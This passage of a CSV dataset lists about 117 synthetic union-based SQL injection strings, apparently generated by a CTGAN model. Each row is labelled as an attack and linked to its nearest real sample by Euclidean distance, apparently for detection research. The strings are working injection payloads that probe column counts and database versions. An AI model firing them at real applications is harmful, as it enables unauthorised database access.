+CTGAN_000384,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000766,4.729970563901181
+CTGAN_000385,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,5.273113822846681
+CTGAN_000386,attack,union,"-9574%'   )    )    union all select 5645,5645,5645,5645,5645,5645,5645--",nearest_attack_euclidean,R000402,6.613691042044301
+CTGAN_000387,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.370361694240784
+CTGAN_000388,attack,union,"1'+  (  select 'idmr' where 5029  =  5029 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000216,4.853140703722714
+CTGAN_000389,attack,union,"-6360'  )   as yfrk where 3683  =  3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",nearest_attack_euclidean,R000443,7.173514102728379
+CTGAN_000390,attack,union,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",nearest_attack_euclidean,R000241,6.35482036057806
+CTGAN_000391,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,5.122909225202937
+CTGAN_000392,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,6.013438578297423
+CTGAN_000393,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,5.748998856635333
+CTGAN_000394,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000542,5.961909348163799
+CTGAN_000395,attack,union,"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000236,5.252068626129196
+CTGAN_000396,attack,union,"-5043%'   )    )     )   union all select 5860,5860,5860,5860,5860#",nearest_attack_euclidean,R000378,4.627570567876305
+CTGAN_000397,attack,union,"-9922'   )    )    union all select 2193,2193,2193--",nearest_attack_euclidean,R000397,5.067796694805437
+CTGAN_000398,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000028,6.352424770051606
+CTGAN_000399,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,6.098625592226291
+CTGAN_000400,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000319,6.751877417135365
+CTGAN_000401,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000510,5.975304731965978
+CTGAN_000402,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,6.938539493811307
+CTGAN_000403,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R000697,6.044122207860411
+CTGAN_000404,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R000711,6.122459862129907
+CTGAN_000405,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000286,6.719297948297847
+CTGAN_000406,attack,union,"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",nearest_attack_euclidean,R000311,4.573672040229716
+CTGAN_000407,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000023,6.640806597911877
+CTGAN_000408,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,5.4359141099512716
+CTGAN_000409,attack,union,"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",nearest_attack_euclidean,R000362,4.424691916234938
+CTGAN_000410,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,4.167134763875434
+CTGAN_000411,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000199,5.527961361294074
+CTGAN_000412,attack,union,"-5372""  )   as wlqm where 2432  =  2432 union all select 2432,2432,2432,2432,2432,2432#",nearest_attack_euclidean,R000324,6.430498525284105
+CTGAN_000413,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000186,5.396983407772508
+CTGAN_000414,attack,union,"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000350,6.438867705654791
+CTGAN_000415,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R000711,5.911472724790747
+CTGAN_000416,attack,union,"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#",nearest_attack_euclidean,R000664,5.7240300945816935
+CTGAN_000417,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000564,7.137754621308301
+CTGAN_000418,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,6.618371182174379
+CTGAN_000419,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000081,6.2206247785829225
+CTGAN_000420,attack,union,"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",nearest_attack_euclidean,R000440,4.899645927532294
+CTGAN_000421,attack,union,"-4605""  )   union all select 8542,8542,8542,8542,8542,8542,8542,8542--",nearest_attack_euclidean,R000179,6.5776019537493475
+CTGAN_000422,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000525,4.956124350155923
+CTGAN_000423,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,4.648501848664316
+CTGAN_000424,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R000746,4.311337567055051
+CTGAN_000425,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,5.498372793542225
+CTGAN_000426,attack,union,"1   )    )    as fynx where 9636  =  9636 union all select null,null,null,null,null--",nearest_attack_euclidean,R000357,6.099598500950606
+CTGAN_000427,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,6.254041336975653
+CTGAN_000428,attack,union,"-7941%'  )   union all select 6965,6965,6965,6965--",nearest_attack_euclidean,R000506,6.6003124976998295
+CTGAN_000429,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,5.078740291274874
+CTGAN_000430,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000510,6.391387634366243
+CTGAN_000431,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,5.335769459820306
+CTGAN_000432,attack,union,"1  )   as nkjo where 8462  =  8462 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000458,6.381798963081232
+CTGAN_000433,attack,union,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",nearest_attack_euclidean,R000265,4.512746822334012
+CTGAN_000434,attack,union,"-9039'  )   union all select 8058,8058,8058,8058,8058--",nearest_attack_euclidean,R000227,5.346764671467779
+CTGAN_000435,attack,union,"-2434'   )    )     )   union all select 5509,5509,5509,5509,5509,5509,5509--",nearest_attack_euclidean,R000451,5.864809395917505
+CTGAN_000436,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,4.6967649063489025
+CTGAN_000437,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000633,5.6558746067978545
+CTGAN_000438,attack,union,"-1413""  )   union all select 6651,6651,6651--",nearest_attack_euclidean,R000717,5.860155313647341
+CTGAN_000439,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,4.870832233244575
+CTGAN_000440,attack,union,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",nearest_attack_euclidean,R000423,8.267453228164761
+CTGAN_000441,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,4.581194877560864
+CTGAN_000442,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000261,5.275949034230166
+CTGAN_000443,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000691,6.027356103911867
+CTGAN_000444,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,5.607318750616538
+CTGAN_000445,attack,union,"-4679 where 9634  =  9634 union all select 9634,9634,9634,9634,9634,9634,9634--",nearest_attack_euclidean,R000728,5.92543101536002
+CTGAN_000446,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,3.301213060063666
+CTGAN_000447,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000180,4.363323437269037
+CTGAN_000448,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000016,6.792009917954497
+CTGAN_000449,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000517,5.250284005620981
+CTGAN_000450,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000766,5.574148382032418
+CTGAN_000451,attack,union," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",nearest_attack_euclidean,R000006,6.7937180568294995
+CTGAN_000452,attack,union,"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",nearest_attack_euclidean,R000681,6.11726496227131
+CTGAN_000453,attack,union,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",nearest_attack_euclidean,R000198,3.9299473172832187
+CTGAN_000454,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000206,6.344446217671206
+CTGAN_000455,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,7.348369858175881
+CTGAN_000456,attack,union,"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",nearest_attack_euclidean,R000517,6.00871080337967
+CTGAN_000457,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000178,4.8072128497595985
+CTGAN_000458,attack,union,"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",nearest_attack_euclidean,R000362,4.864538798464942
+CTGAN_000459,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000542,6.453312055144446
+CTGAN_000460,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000542,6.551193056131574
+CTGAN_000461,attack,union,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",nearest_attack_euclidean,R000349,6.097838228261259
+CTGAN_000462,attack,union,"-8432  )   union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",nearest_attack_euclidean,R000318,4.615386274070774
+CTGAN_000463,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,4.671531426022961
+CTGAN_000464,attack,union,"-7409""   )    )    union all select 3145,3145,3145--",nearest_attack_euclidean,R000284,4.485446778042282
+CTGAN_000465,attack,union,"-8833'   )    )    union all select 3227,3227,3227,3227,3227--",nearest_attack_euclidean,R000426,6.339314500491893
+CTGAN_000466,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R000746,6.198387849874353
+CTGAN_000467,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000303,6.7156565082477675
+CTGAN_000468,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000393,5.404879243620984
+CTGAN_000469,attack,union,"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",nearest_attack_euclidean,R000771,6.287488920974554
+CTGAN_000470,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,5.195970736760206
+CTGAN_000471,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000425,5.5434859978688635
+CTGAN_000472,attack,union,"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",nearest_attack_euclidean,R000229,5.002267036676334
+CTGAN_000473,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000421,5.169278789726094
+CTGAN_000474,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000765,5.509778506434627
+CTGAN_000475,attack,union,"-8609' union all select 9384,9384,9384,9384--",nearest_attack_euclidean,R000621,5.338039273971495
+CTGAN_000476,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,5.149017012163795
+CTGAN_000477,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R000746,4.770095551840601
+CTGAN_000478,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,5.352134803072489
+CTGAN_000479,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R000711,5.901923200716761
+CTGAN_000480,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000219,5.141647039229252
+CTGAN_000481,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,3.7020203266594334
+CTGAN_000482,attack,union,"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000350,6.7921688942531775
+CTGAN_000483,attack,union,"1'+  (  select 'fxhh' where 2571  =  2571 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000480,4.769770122828544
+CTGAN_000484,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000363,5.088909170989727
+CTGAN_000485,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000219,6.429359604080644
+CTGAN_000486,attack,union," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",nearest_attack_euclidean,R000006,7.520830697314882
+CTGAN_000487,attack,union,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",nearest_attack_euclidean,R000199,4.5626695790063705
+CTGAN_000488,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000508,5.479522839676626
+CTGAN_000489,attack,union,"-9039'  )   union all select 8058,8058,8058,8058,8058--",nearest_attack_euclidean,R000227,5.7949429554276115
+CTGAN_000490,attack,union,"-5360' where 8178  =  8178 union all select 8178,8178,8178--",nearest_attack_euclidean,R000616,6.295898000805954
+CTGAN_000491,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.603876310089104
+CTGAN_000492,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000157,6.22972330187005
+CTGAN_000493,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,4.663419593460325
+CTGAN_000494,attack,union,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",nearest_attack_euclidean,R000210,5.802218533875431
+CTGAN_000495,attack,union,"-8612'+  (  select 'iqla' where 5035  =  5035 union all select 5035,5035,5035,5035,5035,5035,5035#",nearest_attack_euclidean,R000775,4.889213917302511
+CTGAN_000496,attack,union,"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",nearest_attack_euclidean,R000362,5.771507346926035
+CTGAN_000497,attack,union,"-4586'  )   as shdb where 6176  =  6176 union all select 6176,6176,6176,6176#",nearest_attack_euclidean,R000423,6.676439530518858
+CTGAN_000498,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000674,5.196380163681191
+CTGAN_000499,attack,union,"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000709,5.69504055901553
+CTGAN_000500,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000144,7.019402205439835
